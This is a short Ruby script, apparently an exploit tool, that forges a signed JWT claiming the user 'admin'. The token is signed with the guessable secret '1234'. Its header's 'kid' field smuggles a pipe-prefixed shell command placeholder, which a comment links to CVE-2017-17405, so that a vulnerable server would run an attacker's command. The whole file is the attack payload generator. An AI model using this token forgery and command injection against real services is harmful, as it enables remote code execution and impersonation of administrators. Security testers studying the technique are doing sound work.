# inspired by Ruby library Net::FTP (CVE-2017-17405), allows attacker to run commands via KID parameter

require 'base64'
require 'openssl'
require 'json'

secret = "1234"

header = {"typ"=>"JWT","alg"=>"HS256","kid"=>"|<CMD TO EXECUTE>"}.to_json

data = {"user" => "admin"}.to_json

token = Base64.strict_encode64(header).gsub("=","")+"."+Base64.strict_encode64(data).gsub("=","")

signed_token = token+"."+Base64.urlsafe_encode64(OpenSSL::HMAC.digest(OpenSSL::Digest.new("sha256"), secret,token))

puts signed_token
